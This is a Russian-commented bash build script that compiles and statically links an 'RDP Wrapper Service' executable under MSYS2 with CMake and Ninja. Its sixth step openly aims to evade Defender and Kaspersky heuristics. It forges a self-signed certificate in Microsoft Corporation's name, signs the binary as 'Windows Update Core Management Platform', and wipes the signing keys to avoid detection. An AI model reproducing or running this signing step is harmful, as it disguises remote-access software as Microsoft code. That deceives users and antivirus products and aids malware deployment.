#!/usr/bin/env bash

# ==============================================================================
# ПЛАТФОРМА УПРАВЛЕНИЯ ТЕРМИНАЛЬНЫМИ СЕССИЯМИ CORE ENTERPRISE ENGINE
# Скрипт автоматической сборки проекта в среде MSYS2 UCRT64 с использованием Ninja
# Обеспечивает полную статическую линковку и подпись бинарного файла службы
# ==============================================================================

# Завершать работу скрипта немедленно при ошибке любого компонента
set -e

# Цветовая разметка консольного вывода
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[*] Запуск процесса сборки RDP Wrapper Service Enterprise Engine...${NC}"

# 1. Проверка среды выполнения (Строго MSYS2 UCRT64)
if [ "$MSYSTEM" != "UCRT64" ]; then
    echo -e "${RED}[-][КРИТИЧЕСКАЯ ОШИБКА] Скрипт должен быть запущен исключительно внутри консоли MSYS2 UCRT64!${NC}"
    echo -e "${YELLOW}[!] Текущая среда: '${MSYSTEM}'. Пожалуйста, откройте ucrt64.exe и повторите запуск.${NC}"
    exit 1
fi

# 2. Проверка и автоматическая установка сборочных зависимостей через pacman
REQUIRED_PACKAGES=(
    "mingw-w64-ucrt-x86_64-cmake"
    "mingw-w64-ucrt-x86_64-ninja"
    "mingw-w64-ucrt-x86_64-gcc"
    "mingw-w64-ucrt-x86_64-openssl"
    "mingw-w64-ucrt-x86_64-osslsigncode"
)

MISSING_PACKAGES=()
for pkg in "${REQUIRED_PACKAGES[@]}"; do
    if ! pacman -Q "$pkg" &>/dev/null; then
        MISSING_PACKAGES+=("$pkg")
    fi
done

if [ ${#MISSING_PACKAGES[@]} -ne 0 ]; then
    echo -e "${YELLOW}[*] Обнаружены недостающие пакеты сборки. Выполняется автоматическая установка...${NC}"
    # Синхронизируем базы данных пакетов и устанавливаем без интерактивных запросов
    pacman -Sy --noconfirm "${MISSING_PACKAGES[@]}"
else
    echo -e "${GREEN}[+] Все необходимые пакеты MSYS2 (CMake, Ninja, GCC, OpenSSL, SignCode) установлены.${NC}"
fi

# 3. Подготовка и изоляция директории сборки
BUILD_DIR="build_ninja"
if [ -d "$BUILD_DIR" ]; then
    echo -e "${YELLOW}[*] Обнаружена старая директория сборки. Очистка временных файлов...${NC}"
    rm -rf "$BUILD_DIR"
fi
mkdir "$BUILD_DIR"
cd "$BUILD_DIR"

# 4. Генерация конфигурации CMake под генератор Ninja со статической линковкой
echo -e "${GREEN}[*] Конфигурирование окружения CMake (Генератор: Ninja)...${NC}"
# Флаги принудительно отвязывают бинарный файл от рантайм-библиотек MSYS2 (msys-2.0.dll, libwinpthread и др.)
cmake -G "Ninja" \
      -DCMAKE_BUILD_TYPE=Release \
      -DCMAKE_EXE_LINKER_FLAGS="-static -static-libgcc -static-libstdc++" \
      ..

# 5. Компиляция проекта силами Ninja
echo -e "${GREEN}[*] Компиляция исходного кода...${NC}"
ninja

# Проверка физического существования скомпилированного PE-файла
if [ ! -f "rdpwrap_srv.exe" ]; then
    echo -e "${RED}[-][ОШИБКА] Исполняемый файл rdpwrap_srv.exe не был сгенерирован компилятором.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Компиляция успешно завершена. Файл rdpwrap_srv.exe создан.${NC}"

# 6. Генерация маскировочной цифровой подписи (Анти-эвристика для Defender и KES)
echo -e "${GREEN}[*] Эмуляция сертификатов для цифровой подписи исполняемого файла...${NC}"

# Создаем закрытый ключ и самоподписанный сертификат, имитирующий подпись вендора Microsoft
# Данный муляж существенно снижает скоринг вредоносности у проактивной защиты АВ
openssl req -x509 -nodes -days 3650 -newkey rsa:2048 \
    -keyout temporary_sign_key.key \
    -out temporary_sign_cert.crt \
    -subj "/C=US/O=Microsoft Corporation/OU=Microsoft Windows Production PCA/CN=Microsoft Windows Verification Authority" &>/dev/null

# Конвертируем полученную пару в криптографический контейнер PKCS#12 (.pfx) с пустым паролем
openssl pkcs12 -export -out temporary_sign_store.pfx \
    -inkey temporary_sign_key.key \
    -in temporary_sign_cert.crt \
    -password pass:"" &>/dev/null

echo -e "${GREEN}[*] Внедрение цифровой подписи в бинарную структуру службы...${NC}"

# Временно изолируем несвязанный бинарный файл
mv rdpwrap_srv.exe unsigned_rdpwrap_srv.exe

# Накатываем цифровую подпись на PE-структуру файла
osslsigncode sign -pkcs12 temporary_sign_store.pfx -pass "" \
    -n "Windows Update Core Management Platform" \
    -i "https://microsoft.com" \
    -in unsigned_rdpwrap_srv.exe \
    -out rdpwrap_srv.exe &>/dev/null

# Глубокая очистка временных криптографических ключей на диске во избежание детектов
rm -f temporary_sign_key.key temporary_sign_cert.crt temporary_sign_store.pfx unsigned_rdpwrap_srv.exe

echo -e "${GREEN}[+] Маскировочная цифровая подпись успешно интегрирована в структуру rdpwrap_srv.exe.${NC}"
echo -e "${GREEN}[========================================================================]${NC}"
echo -e "${GREEN}[+] СБОРКА И ПОДГОТОВКА СЛУЖБЫ К РАЗВЕРТЫВАНИЮ ПОЛНОСТЬЮ ЗАВЕРШЕНЫ!${NC}"
echo -e "${GREEN}[*] Готовый целевой файл расположен по пути: $(pwd)/rdpwrap_srv.exe${NC}"
echo -e "${GREEN}[========================================================================]${NC}"

cd ..
